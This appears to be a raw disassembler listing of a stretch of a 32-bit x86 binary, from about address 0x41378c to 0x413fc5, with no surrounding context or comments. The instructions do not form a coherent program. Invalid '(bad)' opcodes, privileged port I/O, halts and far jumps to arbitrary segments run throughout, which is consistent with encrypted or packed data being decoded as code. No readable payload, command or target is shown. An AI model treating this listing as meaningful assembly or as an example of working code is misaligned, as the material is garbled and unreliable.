  41378c:	mov    edx,0xc23bda1f
  413791:	cmp    eax,0x8b0482f2
  413796:	mov    eax,0x84411eec
  41379b:	es rol bh,0x67
  41379f:	(bad)  
  4137a0:	sub    ebx,eax
  4137a2:	test   BYTE PTR [ecx-0x7d],dh
  4137a5:	adc    esi,eax
  4137a7:	or     BYTE PTR [edx],bl
  4137a9:	test   DWORD PTR ds:0xd3c27457,0x8f2212b3
  4137b3:	daa    
  4137b4:	repz pushf 
  4137b6:	mov    edx,0x47717b13
  4137bb:	scas   eax,DWORD PTR es:[edi]
  4137bc:	int    0x3a
  4137be:	jmp    0x4c9:0xd0e4b17f
  4137c5:	cmp    BYTE PTR [edx],ch
  4137c7:	mul    cl
  4137c9:	mov    ebx,DWORD PTR [esi+0x7cfdcb00]
  4137cf:	xor    ah,BYTE PTR [ebx]
  4137d1:	fsubp  st(0),st
  4137d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d4:	out    dx,al
  4137d5:	mov    edx,0x90c74eda
  4137da:	pop    ebx
  4137db:	cmp    DWORD PTR [esi-0x2e],ecx
  4137de:	unpcklps xmm5,XMMWORD PTR [edi]
  4137e1:	or     al,0xd8
  4137e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e4:	inc    esp
  4137e5:	sub    al,0xd9
  4137e7:	stc    
  4137e8:	stos   BYTE PTR es:[edi],al
  4137e9:	data16 and ch,ch
  4137ec:	xor    DWORD PTR [ebx+0x4d],0x8e7f8c56
  4137f3:	cmp    DWORD PTR [ebp-0x44],0x21
  4137f7:	arpl   ax,di
  4137f9:	cmp    DWORD PTR [ecx-0x4356df7b],0x32eade3b
  413803:	xor    al,ch
  413805:	addr16 loope 0x41380f
  413808:	lods   eax,DWORD PTR ds:[esi]
  413809:	jle    0x413844
  41380b:	and    ebx,DWORD PTR [edi-0x5ea851ac]
  413811:	xchg   esp,eax
  413812:	mov    ebx,DWORD PTR [esi]
  413814:	test   eax,0x6b88cf1d
  413819:	jns    0x41388a
  41381b:	jae    0x41388a
  41381d:	inc    edx
  41381e:	dec    esp
  41381f:	arpl   WORD PTR ds:0xedc67a31,bp
  413825:	sbb    dl,al
  413827:	sbb    eax,0xf278996b
  41382c:	inc    DWORD PTR [ecx]
  41382e:	pop    ecx
  41382f:	xor    ch,dl
  413831:	push   ebx
  413832:	xor    eax,0x549b2355
  413837:	test   BYTE PTR [ecx],al
  413839:	inc    ebp
  41383a:	int3   
  41383b:	int3   
  41383c:	jns    0x41389f
  41383e:	mov    cl,0xca
  413840:	jl     0x41384d
  413842:	inc    esi
  413843:	sti    
  413844:	mov    DWORD PTR [edx+0x79],edx
  413847:	mov    WORD PTR [ebx+0x4a],gs
  41384a:	sub    bh,ch
  41384c:	loop   0x413893
  41384e:	push   edi
  41384f:	xchg   ebp,eax
  413850:	addr16 dec esp
  413852:	mov    ebx,0x8a1c0eb5
  413857:	cmp    al,BYTE PTR [ecx+eax*8]
  41385a:	sbb    al,0xbf
  41385c:	sbb    eax,0x808c5448
  413861:	out    0x3d,eax
  413863:	scas   eax,DWORD PTR es:[edi]
  413864:	out    dx,al
  413865:	jg     0x4138b6
  413867:	pusha  
  413868:	ret    
  413869:	repz mov ebp,0x15f18363
  41386f:	fwait
  413870:	inc    esi
  413871:	rol    DWORD PTR [ebx-0x606e5521],1
  413877:	pop    esp
  413878:	aaa    
  413879:	push   0xcd3ffbfa
  41387e:	nop
  41387f:	fld    DWORD PTR [esi+0x5b]
  413882:	jne    0x41383a
  413884:	and    ecx,DWORD PTR [edi+0x7c]
  413887:	jecxz  0x413890
  413889:	xchg   DWORD PTR [ecx],edi
  41388b:	xor    BYTE PTR [eax-0x4b],ch
  41388e:	or     BYTE PTR [eax+0x65324633],bh
  413894:	add    DWORD PTR [esi-0x75],edi
  413897:	mov    ebx,0x39e6c9da
  41389c:	std    
  41389d:	loopne 0x4138aa
  41389f:	xchg   DWORD PTR [eax+ebx*2-0x167ffe85],ecx
  4138a6:	and    dh,BYTE PTR [ebp-0x1db0e4ef]
  4138ac:	inc    esi
  4138ad:	inc    edi
  4138ae:	inc    eax
  4138af:	mov    ds:0x7df4b641,eax
  4138b4:	imul   ecx,DWORD PTR ds:0xcee68143,0x43589932
  4138be:	aad    0xc8
  4138c0:	cld    
  4138c1:	xchg   ebx,eax
  4138c2:	ror    BYTE PTR [ebp-0x70],0x68
  4138c6:	je     0x41393f
  4138c8:	jb     0x4138fd
  4138ca:	sbb    dh,BYTE PTR [ebx]
  4138cc:	imul   ecx,DWORD PTR [eax+ebx*8],0xc9114646
  4138d3:	in     eax,0x6a
  4138d5:	xchg   ebx,eax
  4138d6:	dec    eax
  4138d7:	inc    ebp
  4138d8:	add    DWORD PTR [eax+ebx*1],ebx
  4138db:	inc    eax
  4138dc:	xor    DWORD PTR [eax],ebp
  4138de:	adc    dh,bl
  4138e0:	fadd   st(0),st
  4138e2:	xor    bl,bh
  4138e4:	(bad)  
  4138e6:	push   edi
  4138e7:	fcom   DWORD PTR ds:0xd26f2810
  4138ed:	cmc    
  4138ee:	mov    ch,0x1d
  4138f0:	and    al,0x9c
  4138f2:	dec    ecx
  4138f3:	fimul  DWORD PTR [ebp+0x5c]
  4138f6:	inc    ebx
  4138f7:	outs   dx,DWORD PTR ds:[esi]
  4138f8:	popf   
  4138f9:	inc    eax
  4138fa:	or     DWORD PTR [ebx-0x723c608c],0x15916cdd
  413904:	jp     0x413908
  413906:	push   eax
  413907:	lea    ebx,ds:0x79498d7a
  41390d:	pusha  
  41390e:	jb     0x4138bf
  413910:	dec    esp
  413911:	pop    es
  413912:	jle    0x4138a3
  413914:	arpl   WORD PTR [ecx],dx
  413916:	clc    
  413917:	mov    BYTE PTR [edi+0x551ddd13],dh
  41391d:	(bad)  [eax-0x18]
  413920:	je     0x41396e
  413922:	data16 hlt 
  413924:	mov    ebp,0x96132064
  413929:	xchg   edx,eax
  41392a:	add    DWORD PTR [ecx+0x76599e27],ebp
  413930:	ins    DWORD PTR es:[edi],dx
  413931:	call   0xa5c4:0xd5426c82
  413938:	push   edi
  413939:	jmp    0x55f:0x6d41e226
  413940:	pop    ss
  413941:	cli    
  413942:	imul   ebx,DWORD PTR [ecx+eax*1],0x46
  413946:	sub    bh,ah
  413948:	jmp    0x4139b1
  41394a:	in     al,0xb8
  41394c:	in     al,0x81
  41394e:	scas   al,BYTE PTR es:[edi]
  41394f:	or     DWORD PTR [ebx+0x7e],edx
  413952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413953:	fistp  DWORD PTR [ecx]
  413955:	mov    eax,0xfa982c3d
  41395a:	sbb    ebx,eax
  41395c:	mov    bl,0x46
  41395e:	test   DWORD PTR [esi],ecx
  413960:	pop    edi
  413961:	(bad)  [ebx]
  413963:	imul   edi,DWORD PTR [ebx],0x5f60773d
  413969:	add    BYTE PTR [ebx-0x39],cl
  41396c:	mov    edi,DWORD PTR [eax+0x55ea752a]
  413972:	fdivr  st(2),st
  413974:	pop    ebp
  413975:	aam    0xdb
  413977:	push   ds
  413978:	aam    0x1e
  41397a:	dec    ebx
  41397b:	scas   al,BYTE PTR es:[edi]
  41397c:	hlt    
  41397d:	aas    
  41397e:	push   ss
  41397f:	adc    dh,BYTE PTR [eax-0x1c]
  413982:	sbb    eax,0x79c6b302
  413987:	fistp  WORD PTR [eax]
  413989:	cmp    cl,BYTE PTR [eax-0x8]
  41398c:	xchg   edx,eax
  41398d:	pop    edi
  41398e:	mov    BYTE PTR [edx+0x2e],cl
  413991:	and    al,0x74
  413993:	mov    esp,0xe1c8cc0c
  413998:	ret    0xbe28
  41399b:	test   BYTE PTR [ecx],bh
  41399d:	push   es
  41399e:	mov    ds:0x3dbc60f7,al
  4139a3:	dec    ebx
  4139a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a5:	inc    ebp
  4139a6:	lock adc al,0xc9
  4139a9:	lea    ebx,[esi]
  4139ab:	jl     0x413957
  4139ad:	inc    eax
  4139ae:	xchg   ebx,eax
  4139af:	sbb    edx,DWORD PTR [edx]
  4139b1:	sar    ch,0x16
  4139b4:	retf   
  4139b5:	fadd   QWORD PTR [ebp+0x21]
  4139b8:	hlt    
  4139b9:	xor    edx,DWORD PTR [edi]
  4139bb:	cdq    
  4139bc:	pushf  
  4139bd:	mov    esi,0x7420fe24
  4139c2:	and    eax,0xb4ae69e0
  4139c7:	ret    0x5300
  4139ca:	push   esi
  4139cb:	ins    BYTE PTR es:[edi],dx
  4139cc:	adc    cl,ah
  4139ce:	pop    ss
  4139cf:	sub    DWORD PTR [eax+0x2a],ecx
  4139d2:	push   esp
  4139d3:	mov    edx,0x1ae707c7
  4139d8:	rcr    DWORD PTR [ebx-0xe],0x46
  4139dc:	js     0x4139b6
  4139de:	dec    ebx
  4139df:	mov    dl,0x2a
  4139e1:	lods   al,BYTE PTR ds:[esi]
  4139e2:	adc    bl,0x19
  4139e5:	enter  0x69d,0x20
  4139e9:	loopne 0x4139e8
  4139eb:	add    esp,DWORD PTR [ecx+ebx*2-0x4ec94726]
  4139f2:	xchg   ebp,eax
  4139f3:	mov    ds:0xfa9358fb,al
  4139f8:	push   cs
  4139f9:	adc    ah,BYTE PTR [ecx]
  4139fb:	ja     0x413a02
  4139fd:	inc    eax
  4139fe:	repz or DWORD PTR [esi],esp
  413a01:	(bad)  
  413a02:	ds xor eax,0xf11e82f3
  413a08:	inc    ebx
  413a09:	and    al,dl
  413a0b:	push   ebx
  413a0c:	fs jg  0x413a4f
  413a0f:	sub    ecx,0xca1a3073
  413a15:	sbb    BYTE PTR [edx+edx*2+0x44144bf3],0xde
  413a1d:	xor    bh,dh
  413a1f:	arpl   cx,sp
  413a21:	rcl    dh,0x49
  413a24:	pop    esi
  413a25:	mov    ebx,0xdd9d51a1
  413a2a:	or     edx,DWORD PTR [ecx*4-0x7c13a59c]
  413a31:	ja     0x4139e8
  413a33:	iret   
  413a34:	mov    es,ecx
  413a36:	mov    bh,0xdf
  413a38:	pop    eax
  413a39:	pop    edx
  413a3a:	xor    eax,0xd13177c
  413a3f:	xor    ebp,edi
  413a41:	cmp    BYTE PTR [ecx+0x21],bh
  413a44:	ds push ds
  413a46:	(bad)  
  413a47:	hlt    
  413a48:	cmp    al,0x3b
  413a4a:	jmp    0xac91:0x17e15673
  413a51:	iret   
  413a52:	add    BYTE PTR [ebx],ch
  413a54:	mov    cl,0x59
  413a56:	adc    cl,al
  413a58:	sub    DWORD PTR [edi-0x2d],edi
  413a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a5c:	inc    edi
  413a5d:	inc    edi
  413a5e:	lea    esi,[ebx]
  413a60:	and    ebp,DWORD PTR [ebp+ebp*1-0x6860b534]
  413a67:	scas   eax,DWORD PTR es:[edi]
  413a68:	nop
  413a69:	pop    ecx
  413a6a:	arpl   WORD PTR [ebx],ax
  413a6c:	add    al,0x4e
  413a6e:	sbb    esp,edi
  413a70:	cli    
  413a71:	ret    
  413a72:	test   eax,0x84b0a5fc
  413a77:	jae    0x413a86
  413a79:	cmp    al,0xd5
  413a7b:	js     0x413a54
  413a7d:	es (bad) 
  413a7f:	xchg   ebx,eax
  413a80:	jae    0x413a94
  413a82:	in     eax,dx
  413a83:	push   edx
  413a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a85:	outs   dx,BYTE PTR ds:[esi]
  413a86:	fisub  DWORD PTR [ebp+0x6c]
  413a89:	fcom   st(0)
  413a8b:	xchg   ebx,eax
  413a8c:	sbb    al,0x55
  413a8e:	dec    ebx
  413a8f:	dec    eax
  413a90:	or     DWORD PTR ss:0x137de2ba,0xb9720b04
  413a9b:	ret    
  413a9c:	xor    cl,al
  413a9e:	xor    al,0xcd
  413aa0:	push   esi
  413aa1:	mov    ebp,0x81078fde
  413aa6:	dec    ebx
  413aa7:	and    DWORD PTR [edi-0x5b],0x81b3eece
  413aae:	mov    bh,0x46
  413ab0:	add    dl,al
  413ab2:	and    DWORD PTR [ebx+0x1d],esp
  413ab5:	popa   
  413ab6:	xor    eax,0xaf31d066
  413abb:	sbb    bh,BYTE PTR [bx+di+0x4e55]
  413ac0:	and    ebp,DWORD PTR gs:[ebp+eiz*1+0x5ff61245]
  413ac8:	push   edx
  413ac9:	js     0x413ad1
  413acb:	rol    BYTE PTR [eax+0x64],0x3b
  413acf:	mov    ebx,0x39135ff5
  413ad4:	fcmovnb st,st(7)
  413ad6:	jo     0x413a5e
  413ad8:	gs jmp 0xc367382d
  413ade:	inc    edi
  413adf:	pop    eax
  413ae0:	(bad)  
  413ae1:	cli    
  413ae2:	popf   
  413ae3:	xor    DWORD PTR [edx+ebx*1+0x6d],esi
  413ae7:	call   0xe908:0x3a1f76db
  413aee:	sbb    BYTE PTR [ecx+ebp*2],al
  413af1:	lahf   
  413af2:	ins    DWORD PTR es:[edi],dx
  413af3:	mov    ds:0x103a04fe,eax
  413af8:	pop    esi
  413af9:	xchg   ecx,eax
  413afa:	inc    ebp
  413afb:	mov    bl,0x57
  413afd:	and    eax,0x63a84680
  413b02:	cs pushf 
  413b04:	mov    eax,0x94865fb6
  413b09:	cmp    dh,BYTE PTR [edi]
  413b0b:	jp     0x413ab2
  413b0d:	mov    ebx,0xa1d081ff
  413b12:	imul   eax,edi,0xffffffb6
  413b15:	pop    ebp
  413b16:	adc    DWORD PTR [eax],ebp
  413b18:	xchg   esp,eax
  413b19:	pusha  
  413b1a:	pop    edx
  413b1b:	sbb    al,0xb3
  413b1d:	adc    edx,DWORD PTR [eax]
  413b1f:	push   ss
  413b20:	mov    edx,0x8318331f
  413b25:	aad    0x8b
  413b27:	std    
  413b28:	jmp    0x584ae1ef
  413b2d:	(bad)  
  413b2e:	mov    bl,0xa6
  413b30:	outs   dx,DWORD PTR ds:[esi]
  413b31:	mov    ah,cl
  413b33:	and    di,WORD PTR [edx+0x5f]
  413b37:	inc    edi
  413b38:	aas    
  413b39:	xchg   edx,eax
  413b3a:	mov    ch,0x2f
  413b3c:	ja     0x413b59
  413b3e:	arpl   WORD PTR [eax+eax*4],dx
  413b41:	sbb    DWORD PTR [edi],esi
  413b43:	lods   al,BYTE PTR ds:[esi]
  413b44:	xchg   ecx,eax
  413b45:	mov    dh,al
  413b47:	out    0xa4,al
  413b49:	imul   edx,DWORD PTR [ecx],0x55f627dc
  413b4f:	push   eax
  413b50:	push   ss
  413b51:	cli    
  413b52:	lea    ecx,[ecx+edi*2+0x397501d8]
  413b59:	test   ecx,esp
  413b5b:	add    eax,edi
  413b5d:	push   edi
  413b5e:	fstp   TBYTE PTR [ebx-0x15]
  413b61:	retf   0x5a0a
  413b64:	xor    eax,0x633149c3
  413b69:	mov    BYTE PTR [ebx-0x389b4ee5],bl
  413b6f:	imul   edx,DWORD PTR [esi+0x4753283d],0x1f
  413b76:	leave  
  413b77:	sbb    eax,0x8770a1b0
  413b7c:	cdq    
  413b7d:	jbe    0x413b7b
  413b7f:	imul   esi,DWORD PTR [ecx],0xffffffc1
  413b82:	popf   
  413b83:	repnz rol BYTE PTR [edi+0x2b],1
  413b87:	push   eax
  413b88:	adc    al,0xf6
  413b8a:	test   eax,0xec3d52e5
  413b8f:	enter  0xbe98,0x5
  413b93:	test   al,0x25
  413b95:	out    0xf6,eax
  413b97:	mov    ecx,0xcff15775
  413b9c:	adc    edx,DWORD PTR [eax+0x15]
  413b9f:	ret    
  413ba0:	in     eax,0xa6
  413ba2:	xchg   edx,eax
  413ba3:	jecxz  0x413bbe
  413ba5:	push   0x97738900
  413baa:	add    al,0x8f
  413bac:	rcl    BYTE PTR [ecx+0x40],1
  413baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bb0:	sub    edx,DWORD PTR [ebp+0x43]
  413bb3:	xor    DWORD PTR [edi+0x43],edx
  413bb6:	jae    0x413b44
  413bb8:	xor    DWORD PTR [edi+0x16f64c81],edx
  413bbe:	and    esp,DWORD PTR [ebx-0x1d]
  413bc1:	addr16 dec ebx
  413bc3:	neg    DWORD PTR [ecx+0x3fe8fb99]
  413bc9:	xor    bh,BYTE PTR [eax+edi*8+0x587e6964]
  413bd0:	mov    ebp,ebx
  413bd2:	cmp    edi,edi
  413bd4:	mov    bh,0x1b
  413bd6:	xor    eax,0x1b046e3b
  413bdb:	sub    eax,0xfc503472
  413be0:	popf   
  413be1:	mov    ds:0xad8dd13,eax
  413be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be7:	fwait
  413be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be9:	lock xchg ebp,eax
  413beb:	jo     0x413bf7
  413bed:	push   edx
  413bee:	vcvtsd2ss xmm6,xmm6,xmm7
  413bf2:	and    BYTE PTR [esi+0x1c7a94cd],dl
  413bf8:	lea    eax,[ebx-0xb07628d]
  413bfe:	scas   eax,DWORD PTR es:[edi]
  413bff:	cdq    
  413c00:	fist   WORD PTR [edx]
  413c02:	adc    eax,0xb304cd2a
  413c07:	inc    edi
  413c08:	adc    BYTE PTR [ebx],ah
  413c0a:	ss or  al,0x8c
  413c0d:	jl     0x413c31
  413c0f:	jae    0x413be0
  413c11:	leave  
  413c12:	mov    ecx,0x3300908c
  413c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c18:	mov    WORD PTR [ebx+0x9],fs
  413c1b:	std    
  413c1c:	ds cmp esi,ebp
  413c1f:	sub    ebx,DWORD PTR [edi+0x54]
  413c22:	xor    esi,DWORD PTR fs:0x37d5381a
  413c29:	retf   0x4ffe
  413c2c:	push   ecx
  413c2d:	in     al,0x36
  413c2f:	aam    0x36
  413c31:	dec    ecx
  413c32:	adc    cl,BYTE PTR [eax+ecx*8+0x68aeba45]
  413c39:	add    esp,DWORD PTR [edi-0x3c]
  413c3c:	mov    es,WORD PTR [edx+eiz*1-0xb]
  413c40:	outs   dx,DWORD PTR ds:[esi]
  413c41:	mov    dl,0x31
  413c43:	das    
  413c44:	retf   0xe1ec
  413c47:	inc    esi
  413c48:	mov    dh,0x39
  413c4a:	in     eax,0xdf
  413c4c:	and    dl,BYTE PTR [ecx+0x3a7fc445]
  413c52:	(bad)  
  413c53:	int3   
  413c54:	push   ebp
  413c55:	mov    ecx,0xee6aad8a
  413c5a:	and    eax,0xbbdb1577
  413c5f:	jmp    0xccc0:0x30ad186c
  413c66:	fwait
  413c67:	jbe    0x413cdb
  413c69:	mov    ah,0x45
  413c6b:	imul   ecx,DWORD PTR [ecx-0x53],0x42
  413c6f:	adc    eax,0xa4cac7e6
  413c74:	push   cs
  413c75:	out    dx,al
  413c76:	js     0x413cd1
  413c78:	add    al,0x60
  413c7a:	xor    BYTE PTR [eax],ch
  413c7c:	jno    0x413cfa
  413c7e:	cs ja  0x413c48
  413c81:	je     0x413c0c
  413c83:	repnz gs push esi
  413c86:	cmp    cl,BYTE PTR ds:[esi-0xc9f70d7]
  413c8d:	add    ebx,DWORD PTR [ebx-0x25]
  413c90:	add    DWORD PTR [edx-0x69a6a04a],esi
  413c96:	push   ss
  413c97:	cli    
	...
  413d14:	push   0x7cbe6434
  413d19:	(bad)  
  413d1a:	cli    
  413d1b:	div    BYTE PTR [ebx-0x302b2b63]
  413d21:	mov    ebp,0xe459b47a
  413d26:	add    BYTE PTR [eax],al
  413d28:	ins    BYTE PTR es:[edi],dx
  413d29:	pop    es
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	daa    
  413d2d:	jle    0x413d59
  413d2f:	dec    edi
  413d30:	add    dh,BYTE PTR [ecx+0x6050a2ae]
  413d36:	data16 mov dl,0xba
  413d39:	add    eax,0xc2443819
  413d3e:	fistp  DWORD PTR [edi-0x1d845622]
  413d44:	cmp    ebp,DWORD PTR [eax]
  413d46:	pop    es
  413d47:	and    eax,0x4673f5a8
  413d4c:	push   0x3bb1623f
  413d51:	out    0x5c,al
  413d53:	inc    eax
  413d54:	mov    ecx,0x7aaf29c4
  413d59:	test   BYTE PTR [ebx-0x20],cl
  413d5c:	dec    esp
  413d5d:	daa    
  413d5e:	aam    0x9
  413d60:	push   cs
  413d61:	ins    DWORD PTR es:[edi],dx
  413d62:	iret   
  413d63:	or     eax,0x3e5f8d6f
  413d68:	jp     0x413d91
  413d6a:	adc    ah,BYTE PTR [esi+0x54]
  413d6d:	out    dx,eax
  413d6e:	aad    0xa4
  413d70:	lock lock add eax,0x961c4607
  413d77:	repnz push esi
  413d79:	lods   eax,DWORD PTR ds:[esi]
  413d7a:	popa   
  413d7b:	xor    eax,0x3b525dcd
  413d80:	stos   DWORD PTR es:[edi],eax
  413d81:	push   bp
  413d83:	imul   ebp,DWORD PTR [esi+ecx*2+0x73],0x28
  413d88:	int    0x32
  413d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d8b:	sbb    al,0x9d
  413d8d:	dec    eax
  413d8e:	lods   al,BYTE PTR ds:[esi]
  413d8f:	fnstenv [edx]
  413d91:	pop    esp
  413d92:	cmp    ebx,DWORD PTR [edi+0x5ca2df29]
  413d98:	or     eax,DWORD PTR [ebx+eax*2-0x1c95f0ec]
  413d9f:	call   0x53532c27
  413da4:	mov    ecx,0x68e469ba
  413da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413daa:	jns    0x413d89
  413dac:	daa    
  413dad:	mov    dh,0x50
  413daf:	sbb    DWORD PTR [ecx],ebp
  413db1:	cwde   
  413db2:	mov    esp,0x4cc57420
  413db7:	pop    es
  413db8:	cmp    eax,0xc9aff010
  413dbd:	mov    cs,esi
  413dbf:	rep outs dx,DWORD PTR ds:[esi]
  413dc1:	mov    al,ds:0xce56d2d5
  413dc6:	cmc    
  413dc7:	and    edi,edx
  413dc9:	cmp    DWORD PTR [esi],ebx
  413dcb:	add    BYTE PTR ds:0x788d886c,al
  413dd1:	xchg   BYTE PTR [esi],ch
  413dd3:	sub    al,0x6c
  413dd5:	out    0x5c,eax
  413dd7:	mov    ds:0xde82e380,al
  413ddc:	xchg   BYTE PTR ds:0x738f04b6,dl
  413de2:	push   ebx
  413de3:	clc    
  413de4:	addr16 pop eax
  413de6:	lods   al,BYTE PTR ds:[esi]
  413de7:	pop    ecx
  413de8:	dec    edx
  413dea:	bound  eax,QWORD PTR [ebx]
  413dec:	add    BYTE PTR [edx+edx*4],0x41
  413df0:	mov    al,ds:0xe5feb259
  413df5:	xchg   edi,eax
  413df6:	(bad)  
  413df7:	call   0x81de:0x7098bfe2
  413dfe:	int3   
  413dff:	loop   0x413d96
  413e01:	adc    al,0x90
  413e03:	(bad)  
  413e04:	mov    cl,0x7f
  413e06:	jno    0x413dcc
  413e08:	or     ebp,ecx
  413e0a:	ins    BYTE PTR es:[edi],dx
  413e0b:	fcom   QWORD PTR [ecx+0x44]
  413e0e:	pop    ebx
  413e0f:	push   0x140fac91
  413e14:	or     ah,BYTE PTR [edi+0x1c]
  413e17:	push   edx
  413e18:	loopne 0x413e1b
  413e1a:	xor    BYTE PTR [edx],0x86
  413e1d:	sub    al,0xd8
  413e1f:	sbb    eax,0xaf3e3ddb
  413e24:	pop    ebx
  413e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e26:	cmp    ch,BYTE PTR [edx-0x51]
  413e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e2a:	mov    ah,0xaf
  413e2c:	cmc    
  413e2d:	icebp  
  413e2e:	mov    ?,WORD PTR [ecx+0x6502056a]
  413e34:	daa    
  413e35:	pop    ds
  413e36:	dec    ebx
  413e37:	arpl   WORD PTR [ebp-0xe],di
  413e3a:	dec    edi
  413e3b:	sub    bl,bl
  413e3d:	in     al,0x35
  413e3f:	sahf   
  413e40:	sbb    eax,0x61260056
  413e45:	push   0xd8d2b874
  413e4a:	mov    al,ds:0x3b81909f
  413e4f:	sbb    esp,edi
  413e51:	inc    ebx
  413e52:	push   cs
  413e53:	pop    ss
  413e54:	xchg   edi,eax
  413e55:	dec    esi
  413e56:	sub    al,0x6c
  413e58:	mov    ecx,0xa817f2c1
  413e5d:	jo     0x413eb0
  413e5f:	adc    al,0x21
  413e61:	xchg   esi,eax
  413e62:	or     ebx,DWORD PTR [ebx+0x62499bec]
  413e68:	jb     0x413ea6
  413e6a:	jnp    0x413ed9
  413e6c:	jp     0x413eb5
  413e6e:	xor    BYTE PTR ds:0xfd7a75e3,cl
  413e74:	je     0x413e80
  413e76:	nop
  413e77:	jnp    0x413e3b
  413e79:	adc    ch,cl
  413e7b:	adc    BYTE PTR [edx+ecx*2+0x31],al
  413e7f:	test   BYTE PTR [edx+0x1d989ab2],al
  413e85:	add    esp,ecx
  413e87:	jle    0x413eaa
  413e89:	and    BYTE PTR [edi+0x57],ah
  413e8c:	dec    edx
  413e8d:	addr16 fwait
  413e8f:	popf   
  413e90:	sahf   
  413e91:	aas    
  413e92:	(bad)  
  413e93:	push   ss
  413e94:	inc    edi
  413e95:	and    al,0x2e
  413e97:	pop    ds
  413e98:	ins    BYTE PTR es:[edi],dx
  413e99:	out    dx,al
  413e9a:	popf   
  413e9b:	cdq    
  413e9c:	xchg   ebx,eax
  413e9d:	shl    DWORD PTR [ebp+0x1f],cl
  413ea0:	and    al,0xd7
  413ea2:	push   esi
  413ea3:	and    ebp,DWORD PTR [edi+0x22]
  413ea6:	fisttp QWORD PTR [edx]
  413ea8:	int3   
  413ea9:	adc    eax,0x958a09ab
  413eae:	shl    DWORD PTR ds:0x1b210da0,0x42
  413eb5:	mov    ss,WORD PTR ds:0xcf109ed2
  413ebb:	xchg   ecx,eax
  413ebc:	mov    ds:0x51b2332,al
  413ec1:	cli    
  413ec2:	enter  0x137,0x51
  413ec6:	inc    ebx
  413ec7:	fnsave [edx+0x7b]
  413eca:	inc    edi
  413ecb:	add    BYTE PTR [ecx-0x4f9eb686],bh
  413ed1:	call   0xc886ee4
  413ed6:	or     BYTE PTR [esi+0x3b],bl
  413ed9:	jne    0x413f18
  413edb:	push   ds
  413edc:	pop    esi
  413edd:	nop
  413ede:	adc    esi,DWORD PTR [esi]
  413ee0:	mov    ds:0x188986c2,eax
  413ee5:	lock daa 
  413ee7:	xor    al,0x2d
  413ee9:	scas   al,BYTE PTR es:[edi]
  413eea:	gs lahf 
  413eec:	lahf   
  413eed:	lock push esp
  413eef:	jmp    0x3ff4:0x4463c4eb
  413ef6:	mov    esi,0x6b3cb77b
  413efb:	lahf   
  413efc:	cmp    ch,BYTE PTR [esp+ebx*8]
  413eff:	jle    0x413f74
  413f01:	xchg   esp,eax
  413f02:	pop    ss
  413f03:	xchg   edi,eax
  413f04:	or     dl,BYTE PTR [esi]
  413f06:	(bad)  
  413f08:	dec    ecx
  413f09:	jg     0x413f2e
  413f0b:	cdq    
  413f0c:	outs   dx,DWORD PTR ds:[esi]
  413f0d:	xor    DWORD PTR [edi-0x66],ebp
  413f10:	sbb    BYTE PTR [ebp+0x2ad2f9cc],cl
  413f16:	bswap  esp
  413f18:	push   0x1a
  413f1a:	lods   eax,DWORD PTR ds:[esi]
  413f1b:	imul   esp
  413f1d:	jb     0x413f7d
  413f1f:	dec    ebx
  413f20:	icebp  
  413f21:	pop    edi
  413f22:	dec    edi
  413f23:	or     edi,eax
  413f25:	cmc    
  413f26:	lea    esp,[ebp-0x769faa3f]
  413f2c:	mov    ch,0xcb
  413f2e:	loop   0x413f17
  413f30:	add    eax,0xc7ea834e
  413f35:	hlt    
  413f36:	cmp    BYTE PTR es:[ebx],dh
  413f39:	shr    BYTE PTR [edi],0x9f
  413f3c:	stos   BYTE PTR es:[edi],al
  413f3d:	(bad)  
  413f3f:	lahf   
  413f40:	fmul   QWORD PTR [esi+0x62]
  413f43:	jle    0x413fb0
  413f45:	loopne 0x413f65
  413f47:	sub    al,BYTE PTR [edi-0x121de516]
  413f4d:	cs nop
  413f4f:	ret    
  413f50:	jbe    0x413ee3
  413f52:	and    ebx,DWORD PTR [edx-0x2f329abc]
  413f58:	mov    ss,WORD PTR [ecx+0x4]
  413f5b:	sub    al,0x93
  413f5d:	jl     0x413fac
  413f5f:	jbe    0x413ee9
  413f61:	loope  0x413f73
  413f63:	sbb    BYTE PTR [edi-0xf],dh
  413f66:	iret   
  413f67:	in     eax,dx
  413f68:	sar    BYTE PTR [ebp-0x38ad410c],0xfe
  413f6f:	jae    0x413f51
  413f71:	xchg   esp,eax
  413f72:	push   ebp
  413f73:	pop    ds
  413f74:	mov    ch,0x10
  413f76:	mov    BYTE PTR [ebx+0x1eff5262],dl
  413f7c:	ja     0x413f5c
  413f7e:	xchg   DWORD PTR [eax],edi
  413f80:	xlat   BYTE PTR ds:[ebx]
  413f81:	push   cs
  413f82:	pusha  
  413f83:	dec    BYTE PTR [esp+ebp*4-0x4b]
  413f87:	add    ebp,edi
  413f89:	pop    esi
  413f8a:	jle    0x413fa1
  413f8c:	mov    bh,0xf4
  413f8e:	lea    esi,[ebx+eax*2+0x2b99e32d]
  413f95:	push   ds
  413f96:	dec    eax
  413f97:	hlt    
  413f98:	int3   
  413f99:	inc    esp
  413f9a:	fiadd  WORD PTR [edx]
  413f9c:	add    DWORD PTR [eax+0x22],edx
  413f9f:	lahf   
  413fa0:	inc    esi
  413fa1:	sbb    eax,0x23c204c6
  413fa6:	dec    ebp
  413fa7:	enter  0x6169,0xe8
  413fab:	lock pop ss
  413fad:	and    BYTE PTR [eax],dh
  413faf:	clc    
  413fb0:	and    ah,BYTE PTR [ebp-0x602f3a88]
  413fb6:	test   BYTE PTR [ebp+0x53],dh
  413fb9:	mov    al,ds:0xd7af3c31
  413fbe:	jbe    0x41402b
  413fc0:	push   ecx
  413fc1:	cld    
  413fc2:	cmp    BYTE PTR [ebx+0x18],cl
  413fc5:	imul   ecx,DWORD PTR [edi],0x7f
